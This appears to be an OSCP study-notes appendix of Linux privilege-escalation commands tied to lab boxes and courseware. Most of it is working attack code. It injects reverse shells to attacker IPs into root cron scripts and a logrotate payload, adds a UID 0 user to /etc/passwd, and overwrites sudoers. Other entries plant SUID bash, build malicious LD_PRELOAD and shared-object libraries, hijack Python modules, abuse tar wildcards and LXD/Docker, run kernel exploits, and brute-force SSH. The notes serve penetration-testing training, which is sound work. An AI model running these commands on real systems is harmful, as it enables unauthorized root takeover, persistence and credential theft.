# Linux Privilege Escalation, Command Appendix

Part of [[COMMAND APPENDIX]]. All commands from Module 18 (Linux Privilege Escalation). Full technique walkthroughs: [[18. Linux Privilege Escalation|Linux Privilege Escalation]]. Decision tree: [[Linux Privilege Escalation (Decision Tree)]].

---

## Manual Enumeration Checklist

```bash
# Who am I and what groups do I belong to?
id

# Who else is on the machine?
cat /etc/passwd

# OS, kernel, architecture
hostname
cat /etc/issue
cat /etc/os-release
uname -a       # kernel version + arch
arch

# Running processes (look for root-owned scripts/custom services)
ps aux

# Network interfaces (two interfaces = pivot potential)
ip a
routel

# Open ports and connections (look for 127.0.0.1-only listeners)
ss -anp

# Firewall rules (may reveal restricted ports or misconfigured chains)
cat /etc/iptables/rules.v4

# Cron jobs (look for (root) CMD ... entries)
ls -lah /etc/cron*
crontab -l
grep "CRON" /var/log/syslog       # Ubuntu/Debian with syslog
cat /var/log/cron.log             # Kali/Debian containers

# Installed packages and versions
dpkg -l          # Debian/Ubuntu
rpm -qa          # RHEL/CentOS

# Writable directories outside home (scripts executed by higher-priv users?)
find / -writable -type d 2>/dev/null

# Writable files (look for /etc/passwd, cron scripts, service configs)
find / -writable -type f 2>/dev/null | grep -v proc

# Disks and network mounts (unmounted partitions may hold data)
cat /etc/fstab
mount
lsblk

# Loaded kernel modules (match against CVE databases if hunting driver exploits)
lsmod
/sbin/modinfo <module_name>

# SUID binaries (anything non-standard goes straight to GTFOBins)
find / -perm -u=s -type f 2>/dev/null
```

---

## Automated Enumeration

```bash
# unix-privesc-check (pre-installed on Kali: /usr/bin/unix-privesc-check)
# Transfer to target first (scp /usr/bin/unix-privesc-check user@target:~/)
./unix-privesc-check standard 2>/dev/null | grep -A 2 "WARNING"

# LinPEAS (download from https://github.com/carlospolop/PEASS-ng/releases)
chmod +x linpeas.sh
./linpeas.sh 2>/dev/null | tee linpeas_output.txt
# Red/yellow output = high confidence findings. Start there.

# LinEnum
chmod +x LinEnum.sh && ./LinEnum.sh
```

---

## Credential Hunting (Module 18.2)

```bash
# Environment variables
env

# Dotfiles / shell startup files
cat ~/.bashrc
cat ~/.bash_profile
cat ~/.bash_history
cat ~/.zshrc

# Try found credential directly against root
su - root

# Build targeted wordlist from partial credential (e.g. Lab+3 digits)
crunch 6 6 -t Lab%%% > wordlist.txt

# SSH brute-force with known username
hydra -l $Username -P wordlist.txt $BoxIP -t 4 ssh -V

# Once on another account, check sudo
sudo -l
```

---

## Service Footprint Inspection (Module 18.2.2)

```bash
# Watch process list for credentials in command args (run for 2-5 minutes)
watch -n 1 "ps -aux | grep pass"

# Sniff loopback traffic for cleartext credentials
sudo tcpdump -i lo -A | grep "pass"

# Check AppArmor status (may block tcpdump GTFOBins technique)
cat /var/log/syslog | grep apparmor  # look for apparmor="DENIED"
aa-status
```

---

## Cron Job Abuse (Module 18.3.1)

```bash
# Find cron jobs running as root
grep "CRON" /var/log/syslog | tail -30
cat /var/log/cron.log              # alternative on Kali/Debian containers

# Check the called script's permissions
ls -lah /path/to/script.sh
cat /path/to/script.sh

# Inject mkfifo reverse shell (append -- don't overwrite)
echo >> /path/to/script.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LocalIP $Port >/tmp/f" >> /path/to/script.sh

# Alternative: direct bash reverse shell
echo 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1' >> /path/to/script.sh

# Listener on Kali
nc -lnvp $Port
```

---

## /etc/passwd World-Writable Abuse (Module 18.3.2)

```bash
# Confirm write access
ls -lah /etc/passwd

# Generate a password hash (crypt algorithm, usable in /etc/passwd)
openssl passwd w00t

# Inject a new UID 0 user
echo 'root2:$AdminHash:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to the injected user
su root2
# password: w00t
```

## User cron filename command injection

Cron review must include user-specific crontabs and scripts that process web-writable directories. If a scheduled script inserts a filename into a shell command without quoting, the filename becomes the command-injection primitive.

```bash
crontab -l
find /home -maxdepth 2 -type f \( -name 'crontab.*' -o -name '*cron*' \) -ls 2>/dev/null
sed -n '1,240p' $CronScript
```

Use a harmless marker first and wait for one full interval:

```text
x;touch${IFS}cron_marker
```

Confirm the marker owner before encoding a callback command. Base64 keeps shell metacharacters and spaces out of the filename:

```bash
EncodedPayload=$(printf 'bash -i >& /dev/tcp/%s/%s 0>&1' "$LocalIP" "$Port" | base64 -w0)
nc -lvnp $Port
```

The exact file-creation request depends on the upload or webshell path. Preserve the original script and remove only the controlled filename and marker afterward. See [[OSCP/BOXES/WRITE UPS/Linux/Networked|HTB Networked]].

---

## SUID Binary Exploitation (Module 18.4.1)

```bash
# List SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Verify effective UID while a SUID binary is running
grep Uid /proc/<PID>/status
# Uid: 1000  0  0  0  (real=joe, effective=root = SUID working)

# GTFOBins SUID examples:
# find
find . -exec /bin/sh -p \; -quit

# bash
bash -p

# python
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

> See https://gtfobins.github.io/ -- filter by SUID -- for the full list per binary.

### DOSBox SUID → Sudoers Write (non-GTFOBins pattern)

DOSBox is a DOS emulator. When it is SUID root, its mounted-drive file writes run with root effective privileges.

```bash
# Check if dosbox is SUID
find / -perm -u=s -type f 2>/dev/null | grep dosbox

# Mount /etc as DOS drive C:, then overwrite sudoers
dosbox -c 'mount c /etc' -c 'echo $Username ALL=(ALL) NOPASSWD: ALL > c:\sudoers' -c 'exit'
# ALSA/audio errors are normal when no sound device is available.

# Verify
sudo -n id
# uid=0(root)
sudo -n bash

# Cleanup — restore from the pacman package cache (Arch Linux)
bsdtar -xOf /var/cache/pacman/pkg/sudo-<version>-x86_64.pkg.tar.zst etc/sudoers > /etc/sudoers
grep NOPASSWD /etc/sudoers   # should return nothing
```

> `echo >` overwrites sudoers entirely; restore it from the original package or a verified backup. Source: Nukem (PG Practice), [[OSCP/RUNBOOK V2/Linux - SUID Check|PrivEsc Linux - SUID]]

### Custom SUID source review: adjacent string overwrite

When a non-standard SUID helper has readable source, inspect the data flow before using a generic fuzzing workflow. Covfefe's helper uses `gets()` on a 20-byte buffer, checks a fixed five-byte prefix, and passes an adjacent `program` string to `execve()`.

```bash
SourceFile=/root/read_message.c
SuidPath=/usr/local/bin/read_message
sed -n '1,160p' $SourceFile
checksec --file=$SuidPath
readelf -h -l -s $SuidPath
objdump -d -M intel $SuidPath
# Five accepted bytes + fifteen padding bytes + a NUL-terminated replacement path
(printf 'SimonAAAAAAAAAAAAAAA/bin/sh\0\n'; cat) | $SuidPath
id
```

This is a local data overwrite, not a saved-return-address exploit. The existing SUID `execve()` call supplies the execution primitive, so no shellcode or ROP chain is needed. The NUL terminator keeps `/bin/sh` a valid C string, and an open stdin stream keeps the resulting shell interactive. Confirm `euid=0` rather than requiring the real UID to change.

See [[OSCP/BOXES/WRITE UPS/Linux/Covfefe|Covfefe]] and [[COMMAND BREAKDOWNS/Privilege Escalation & Local Exploitation (Breakdowns)#Covfefe: custom SUID source review before blind fuzzing|Command Breakdowns]].

---

## Linux Capabilities Exploitation (Module 18.4.1)

```bash
# Find binaries with capabilities
/usr/sbin/getcap -r / 2>/dev/null

# Target: cap_setuid+ep
# Perl (GTFOBins)
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# Python3 (GTFOBins)
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# gdb (GTFOBins)
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
```

---

## Sudo Abuse (Module 18.4.2)

```bash
# List current user's sudo permissions
sudo -l

# Check AppArmor (may block shell escapes even with valid sudo access)
cat /var/log/syslog | grep <binary>  # look for apparmor="DENIED"

# GTFOBins sudo examples (check for YOUR actual binary, not module examples):
# apt-get
sudo apt-get changelog apt   # when less pager opens: !/bin/sh

# gcc
sudo gcc -wrapper /bin/sh,-s .

# vim
sudo vim -c '!sh'

# find
sudo find / -exec /bin/sh \; -quit

# less
sudo less /etc/hosts    # then: !/bin/sh

# man
sudo man man    # then: !/bin/sh
```

> Always look up the actual allowed binary on GTFOBins, not the module example. The VM may differ.

## Sudo script that generates a privileged configuration

When sudo allows a custom script, read the script instead of treating it like a normal binary escape. A script that accepts input, writes configuration assignments, and then invokes a privileged helper may be exploitable when the helper sources the generated file.

```bash
sudo -n -l
sed -n '1,240p' $SudoScript
grep -RniE 'source|\. |ifup|ifdown|systemctl|service|eval|exec|echo.*\$' $SudoScript /usr/local/sbin 2>/dev/null
```

Review the validation and quoting boundary. If spaces or shell separators survive into a file consumed by a root helper, use the documented input prompts with a controlled command-bearing value, verify `id`, and remove the generated configuration. See [[OSCP/BOXES/WRITE UPS/Linux/Networked|HTB Networked]].

For the Networked-style `changename.sh` prompt sequence, source review showed that three ordinary values followed by a space-bearing `BOOTPROTO` value reached `ifup`:

```text
x
x
x
dhcp /bin/bash
```

Do not apply this input to an unreviewed script. The exploitable condition is the combination of accepted spaces, unquoted assignment output, and a privileged helper that sources the result.

---

## Kernel Exploit Workflow (Module 18.4.3)

```bash
# Step 1: Gather system info on target
cat /etc/issue
cat /etc/os-release
uname -r          # kernel version (e.g. 4.4.0-116-generic)
arch              # architecture (e.g. x86_64)

# Step 2: Search on Kali
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"
searchsploit "linux kernel 4.4"
searchsploit -x $BoxDir | head -30   # inspect source before using

# Step 3: Transfer to target and compile there (avoids glibc mismatch)
# On Kali:
scp exploit.c user@$BoxIP:~/

# On target:
gcc exploit.c -o exploit
./exploit

# For PwnKit (CVE-2021-4034, pkexec < 0.120, not in searchsploit):
# On Kali:
git clone https://github.com/berdav/CVE-2021-4034.git /tmp/pwnkit
scp -r /tmp/pwnkit user@$BoxIP:/tmp/pwnkit

# On target (compile natively to avoid glibc mismatch):
cd /tmp/pwnkit
gcc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
gcc -Wall cve-2021-4034.c -o cve-2021-4034-local
./cve-2021-4034-local
```

**Check binary version before searching exploits:**
```bash
pkexec --version          # target: 0.105 → PwnKit (CVE-2021-4034)
snap --version            # target: snapd < 2.37.1 → dirty_sock (CVE-2019-7304)
ntfs-3g --version         # target: 2015.3.14 → CVE-2017-0358
```

---

## Path Abuse (HTB Supplementary)

If a writable directory (commonly `/tmp`) appears early in `$PATH`, a script that calls an external binary without an absolute path will load your version instead.

```bash
# Check for writable directories in PATH
echo $PATH
# Dangerous: /tmp:/usr/local/bin:/usr/bin:/bin

# Identify which binary the root script calls (read the script first)
cat /opt/scripts/backup.sh

# Create a fake binary in the writable PATH entry
cat > /tmp/cp << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
EOF
chmod +x /tmp/cp

# Wait for root to run the script, then use the SUID bash
/tmp/rootbash -p
```

See [[18. Linux Privilege Escalation|LPE.4]].

#### Tags: #PathAbuse #LinuxPrivesc

---

## Restricted Shell Escape (HTB Supplementary)

```bash
# SSH bypass — skips the login shell and profile that loads restrictions
ssh user@STMIP -t "bash --noprofile"

# In-session escapes
vi /dev/null
:set shell=/bin/bash
:shell

# Python (if available in the restricted env)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# awk
awk 'BEGIN {system("/bin/bash")}'

# less pager shell escape
less /etc/passwd
!bash
```

See [[18. Linux Privilege Escalation|LPE.5]].

#### Tags: #RestrictedShell #ShellEscape #LinuxPrivesc

---

## Privileged Group Abuse (HTB Supplementary)

```bash
# Check group memberships
id
groups
cat /etc/group | grep "adm\|sudo\|docker\|lxd\|disk\|shadow"

# adm group: read system logs
ls /var/log/
grep -r "password\|cred\|secret" /var/log/apache2/ 2>/dev/null

# disk group: raw device read (read any file)
df -h               # find disk device (e.g. /dev/sda1 mounted at /)
debugfs /dev/sda1   # interactive filesystem debugger
# In debugfs: cat /root/.ssh/id_rsa

# shadow group: read password hashes
cat /etc/shadow
# Crack offline with hashcat
```

See [[18. Linux Privilege Escalation|LPE.8]].

#### Tags: #PrivilegedGroups #admGroup #LinuxPrivesc

---

## LXD Container Escape (HTB Supplementary)

Requires membership in the `lxd` group.

```bash
# On attack box: build minimal Alpine image
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder && bash build-alpine
python3 -m http.server 80

# On target:
wget http://PWNIP/alpine-v3.XX-x86_64-<date>.tar.gz

lxc image import ./alpine*.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh

# Inside container — host filesystem at /mnt/root
cat /mnt/root/root/flag.txt
# Or plant SUID bash:
cp /mnt/root/bin/bash /mnt/root/tmp/rootbash && chmod +s /mnt/root/tmp/rootbash
# On host: /tmp/rootbash -p
```

See [[18. Linux Privilege Escalation|LPE.12]].

#### Tags: #LXD #ContainerEscape #LinuxPrivesc

---

## Docker Group Escape (HTB Supplementary)

Requires membership in the `docker` group.

```bash
# Confirm access
id | grep docker
docker images   # check available images

# Mount host root into container and chroot
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash

# Inside container (as root, with host filesystem as /)
whoami          # root
cat /root/flag.txt

# Or plant SUID bash for host persistence
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
# Exit container, then on host: /tmp/rootbash -p
```

See [[18. Linux Privilege Escalation|LPE.13]].

#### Tags: #Docker #DockerEscape #LinuxPrivesc

---

## Logrotate Exploitation — logrotten (HTB Supplementary)

Race condition in logrotate's `create` mode when a writable log file is being rotated.

```bash
# On attack box: compile logrotten
git clone https://github.com/whotwagner/logrotten.git
cd logrotten && gcc logrotten.c -o logrotten

# Prepare payload (bash_completion.d will be sourced by root's next bash login)
cat > /tmp/payload << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1
EOF
chmod +x /tmp/payload

# Transfer logrotten and payload to target, then run
./logrotten -p /tmp/payload /var/log/some_writable.log

# Trigger logrotate (write to the log to cause a rotation, or wait for schedule)
echo "test" >> /var/log/some_writable.log
```

See [[18. Linux Privilege Escalation|LPE.14]].

#### Tags: #Logrotate #logrotten #LinuxPrivesc

---

## NFS No Root Squash (HTB Supplementary)

```bash
# Target: enumerate NFS exports
cat /etc/exports
# Look for: /share   *(rw,no_root_squash)

# Attack box: enumerate remotely
showmount -e STMIP

# Attack box: mount and plant SUID bash
sudo mount -t nfs STMIP:/share /mnt/nfs
sudo cp /bin/bash /mnt/nfs/rootbash
sudo chmod +s /mnt/nfs/rootbash

# Target: use the SUID bash
ls -la /share/rootbash   # confirm rws
/share/rootbash -p
```

See [[18. Linux Privilege Escalation|LPE.15]].

#### Tags: #NFS #NoRootSquash #LinuxPrivesc

---

## LD_PRELOAD Shared Library Injection (HTB Supplementary)

Requires `env_keep+=LD_PRELOAD` in sudoers config.

```bash
# Confirm: sudo -l shows env_keep+=LD_PRELOAD

# Write the malicious shared library
cat > /tmp/privesc.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/privesc.so /tmp/privesc.c -nostartfiles

# Inject when running any sudo-allowed binary
sudo LD_PRELOAD=/tmp/privesc.so <sudo-allowed-binary>
```

See [[18. Linux Privilege Escalation|LPE.17]].

#### Tags: #LDPreload #SharedLibrary #LinuxPrivesc

---

## Shared Object Hijacking (HTB Supplementary)

SUID binary loads a `.so` from a writable directory in its RUNPATH.

```bash
# Find the RUNPATH (custom shared library search path baked into the binary)
readelf -d /opt/some_binary | grep -i "rpath\|runpath"
# Example: Library runpath: [/development/lib/]

# Confirm that directory is writable
ls -la /development/lib/

# Find what the binary imports
ldd /opt/some_binary

# Compile malicious .so named to match the expected library
cat > /development/lib/libcustom.c << 'EOF'
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    setuid(0);
    system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
}
EOF
gcc -fPIC -shared -o /development/lib/libcustom.so /development/lib/libcustom.c

# Run the SUID binary — it loads your .so first
/opt/some_binary
/tmp/rootbash -p
```

**Check glibc version:** `ldd --version`

See [[18. Linux Privilege Escalation|LPE.18]].

#### Tags: #SharedObject #SOHijacking #LinuxPrivesc

---

## Python Library Hijacking (HTB Supplementary)

If a sudo-allowed Python script imports a module whose file is writable.

```bash
# Find where the module lives
python3 -c "import psutil; print(psutil.__file__)"

# Check if writable
ls -la /path/to/psutil/__init__.py

# Append payload to module (runs on every import)
echo 'import os; os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")' \
  >> /path/to/psutil/__init__.py

# Trigger via sudo
sudo python3 /opt/script.py
/tmp/rootbash -p
```

PYTHONPATH variant (requires `env_keep+=PYTHONPATH` in sudoers):

```bash
mkdir /tmp/psutil
echo 'import os; os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")' \
  > /tmp/psutil/__init__.py
sudo PYTHONPATH=/tmp python3 /opt/script.py
/tmp/rootbash -p
```

See [[18. Linux Privilege Escalation|LPE.19]].

#### Tags: #PythonHijack #LibraryHijacking #LinuxPrivesc

---

## Sudo -u#-1 Bypass — CVE-2019-14287 (HTB Supplementary)

Affects sudo < 1.8.28. A sudoers entry with `(ALL, !root)` is meant to block running as root, but UID `-1` maps to UID 0 anyway.

```bash
# Vulnerable sudoers pattern:
# (ALL, !root) NOPASSWD: /usr/bin/ncdu

# Bypass
sudo -u#-1 /usr/bin/ncdu
# Inside ncdu: press 'b' to open a root shell

# Direct shell (if binary allows)
sudo -u#-1 /bin/bash
```

See [[18. Linux Privilege Escalation|LPE.20]].

#### Tags: #SudoBypass #CVE201914287 #LinuxPrivesc

---

## GNU Screen 4.5.0 LPE (HTB Supplementary)

```bash
# Verify version
screen --version   # GNU Screen 4.5.0

# Get exploit
searchsploit screen 4.5
searchsploit -m 41154.sh

# Read before running (it creates a SUID root shell)
cat 41154.sh
bash 41154.sh
/tmp/rootsh -p
```

See [[18. Linux Privilege Escalation|LPE.10]].

#### Tags: #GNUScreen #VulnerableService #LinuxPrivesc

---

## Dirty Pipe — CVE-2022-0847 (HTB Supplementary)

Affects Linux kernel 5.8 through 5.17. Allows unprivileged users to overwrite arbitrary read-only file contents via pipe splice.

```bash
# Verify kernel
uname -r   # 5.8 - 5.17 = vulnerable

# PoC implementations:
# github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits (SUID binary overwrite variant)
# github.com/n3rada/CVE-2022-0847 (/etc/passwd overwrite variant)

gcc -o dirtypipe dirtypipe.c
./dirtypipe
# Drops root shell or modifies /etc/passwd to add passwordless root user
```

See [[18. Linux Privilege Escalation|LPE.22]].

#### Tags: #DirtyPipe #CVE20220847 #KernelExploit #LinuxPrivesc

---

---

## Sudo Tar Wildcard Injection

When sudo allows `tar` with a bare `*` wildcard in a directory you can write to, plant filenames that tar interprets as flags.

**Step 1 — Create payload script in the wildcard directory:**
```bash
cat > ~/privesc.sh << 'EOF'
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
EOF
chmod +x ~/privesc.sh
```

**Step 2 — Plant checkpoint filenames:**
```bash
echo "" > ~/'--checkpoint=1'
echo "" > ~/'--checkpoint-action=exec=bash privesc.sh'
```

> ⚠️ Use `exec=bash privesc.sh` not `exec=./privesc.sh` or `exec=privesc.sh` — the checkpoint executor doesn't search CWD; `bash` resolves as an executable and then loads the script from CWD.
> Cannot embed `/` in a filename — so absolute paths in exec= are not possible via this vector.

**Step 3 — Trigger the sudo command:**
```bash
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

**Step 4 — Root shell:**
```bash
ls -la /tmp/rootbash   # confirm: -rwsr-sr-x root root
/tmp/rootbash -p
whoami                 # root
```

**Cleanup:**
```bash
rm /tmp/rootbash ~/privesc.sh ~/'--checkpoint=1' ~/'--checkpoint-action=exec=bash privesc.sh'
```

> Source: Cockpit (PG Practice), [[OSCP/RUNBOOK V2/Linux - Sudo Check|PrivEsc Linux - Tar Wildcard]]
> Reference: [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/)

#### Tags: #TarWildcard #SudoMisconfiguration #WildcardInjection #LinuxPrivesc

---

## aureport TTY Credential Hunt

When you have shell access as a user in the `adm` group (or as root), Linux audit logs record all TTY input including passwords typed to `su`. `aureport --tty` decodes the audit records and prints them in readable form.

```bash
# Requires read access to /var/log/audit/audit.log (adm group or root)
aureport --tty | less

# Example output showing a typed password:
# 2. 06/01/22 07:13:14  su  "ILFreightnixadm!",<nl>
# 4. 06/01/22 07:13:28  sudo  "ILFreightnixadm!"

# Grep for credential-like entries
aureport --tty | grep -E '"[^"]{6,}"'
```

Expected: any password typed interactively to `su`, `sudo`, or `ssh` appears in the data column inside double quotes.

**Why it works:** Linux Audit Daemon (`auditd`) logs all TTY keystrokes when configured with `-a always,exit -F arch=b64 -S execve` or similar rules. The `tty` action records interactive input, including password prompts. `aureport` decodes the hex-encoded keystroke records into human-readable form.

**Required permissions:** readable `/var/log/audit/audit.log`, typically requires being in the `adm` group or running as root. The `webdev` user in AEN had implicit audit log access.

See [[27. Assembling the Pieces|AEN.4]] for the real-world example.

#### Tags: #aureport #AuditLogs #CredentialHunting #LinuxPrivesc #adm #HTBSupplementary

---

#### Tags: #LinuxPrivesc #SUID #Capabilities #CronJob #sudo #KernelExploit #etcpasswd #Module18 #PathAbuse #RestrictedShell #LXD #Docker #Logrotate #NFS #LDPreload #SharedObject #PythonHijack #DirtyPipe #GNUScreen #SudoBypass #aureport #HTBSupplementary
## External Resources

- [HackTricks - Windows and Linux Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for shell payload selection
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
## Why this matters for OSCP

This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.

## Related Modules

- [[OSCP/MODULES/18. Linux Privilege Escalation]] -- module concepts used by this hub page

## Demonstrated in box write-ups

- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- demonstrates the workflow described here
- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- user cron filename injection and sudo-generated configuration parsing
- [[OSCP/BOXES/WRITE UPS/Linux/Covfefe|Covfefe]] -- custom SUID source review and adjacent-string privilege escalation
- [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- `sudo tar` checkpoint execution, systemd timer inspection, and archive replacement with an architecture-matched SUID helper
- [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]] -- Luvit `os.execute()` run-as pivot, group-writable MOTD script, SSH trigger, and SUID Bash `-p`

## TartarSauce: tar, systemd timer, and archive trust boundary

Check the exact sudo rule first:

```bash
sudo -l
sudo -u onuma /bin/tar -cf /dev/null /dev/null \
  --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

Enumerate systemd timers and inspect the invoked script:

```bash
systemctl list-timers --all
systemctl cat backuperer.timer backuperer.service 2>/dev/null
sed -n '1,240p' /usr/sbin/backuperer
uname -m
file /bin/bash
```

Build an architecture-matched helper and preserve root/SUID metadata in the archive:

```bash
gcc -m32 -Os -s /tmp/suid.c -o "$BoxDir/exploits/suid"
file "$BoxDir/exploits/suid"
mkdir -p /dev/shm/evil/var/www/html
cp "$BoxDir/exploits/suid" /dev/shm/evil/var/www/html/roothelper
tar --owner=0 --group=0 --mode=4755 -czf /dev/shm/evil.tar.gz \
  -C /dev/shm/evil var/www/html/roothelper
```

Wait for a stable hidden archive before replacing it:

```bash
while true; do
  Candidate=$(find /var/tmp -maxdepth 1 -type f -name '.[0-9a-f]*' -printf '%p\n' 2>/dev/null | head -n1)
  [ -z "$Candidate" ] && sleep 1 && continue
  A=$(stat -c '%s' "$Candidate" 2>/dev/null || echo 0); sleep 1
  B=$(stat -c '%s' "$Candidate" 2>/dev/null || echo 0)
  [ "$A" -gt 0 ] && [ "$A" = "$B" ] && cp /dev/shm/evil.tar.gz "$Candidate" && break
done
```

**Gotcha:** an extracted x86_64 helper cannot execute on this i686 target. Check `file` before entering the timer race.

## Chef Knife `sudo` escape

When `sudo -l` grants root execution of `/usr/bin/knife` without a password, inspect its version and use Knife's Ruby evaluation feature. Ruby's `exec` replaces the Knife process while retaining the root identity acquired by sudo.

```bash
sudo -l
command -v knife
knife --version
sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
id
whoami
```

Use the exact binary path from sudoers and record the identity proof privately. The direct reference is [GTFOBins Knife](https://gtfobins.org/gtfobins/knife/).

**Seen in:** [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]].
